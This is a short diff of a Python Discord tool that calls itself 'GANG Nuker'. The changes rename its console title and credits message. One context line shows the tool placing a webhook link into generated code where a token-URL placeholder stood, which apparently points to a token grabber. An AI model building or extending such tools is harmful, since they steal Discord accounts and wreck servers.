@@ -3,7 +3,7 @@ from tqdm import tqdm, trange
 from time import sleep
 import os
 
-os.system("title Loading GANG Nuker...")
+os.system("title Loading GANG Discord...")
 print(f"{Fore.MAGENTA}")
 progressbar = tqdm([2,4,6,8,9,10])
 for item in progressbar:
@@ -2077,7 +2077,7 @@ main()""".replace("~~TOKENURLHERE~~", webhooklink))
 
 
     if choice == '23':
-        print(f'''{Fore.WHITE} \nHello, just a quick message talking about GANG Nuker!
+        print(f'''{Fore.WHITE} \nHello, just a quick message talking about GANG Discord controlled!
 - This "GANG Nuker" was created / dev by ! ・Martin#9693
 - 17 years old and mainly code with python and sometimes java!
 - Thanks for using my tools and make sure not to skid it <3
